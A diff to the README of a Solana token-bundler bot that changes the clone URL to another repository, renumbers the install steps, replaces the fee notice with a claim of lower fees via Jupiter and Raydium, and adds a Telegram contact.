@@ -9,13 +9,15 @@
 ## Installation
 
 1. Clone the repository:
-   git clone https://github.com/youngpriince/sol-moonshot-bundler.git
-   cd sol-moonshot-bundler
+   
+   git clone https://github.com/0XTan1319/Moonshot-Bundler.git
+   
+   cd Moonshot-Bundler
 
-2. Install dependencies:
+3. Install dependencies:
    npm install
 
-3. Create a `.env` file in the root directory and add your configuration:
+4. Create a `.env` file in the root directory and add your configuration:
    AMOUNT=0.001
    TOKEN_ADDRESS=your_token_address
    DELAY=2000
@@ -48,8 +50,12 @@ Adjust the settings in your `.env` file to customize the bot's behavior:
 
 This bot uses the Solana Swap API from [SolanaTracker.io](https://docs.solanatracker.io).
 
-**Note**: The Swap API charges a fee for usage:
+## Updated version
 
-- Standard fee: 0.5% on each successful transaction
+Now this bot is using solana swap api.
 
-## License
+Using Jupiter swap and raydium swap make the fee rate lower.
+
+## Contact
+
+If you have a question or any suggestion, ask here: [Telegram: @shiny0103](https://t.me/shiny0103)
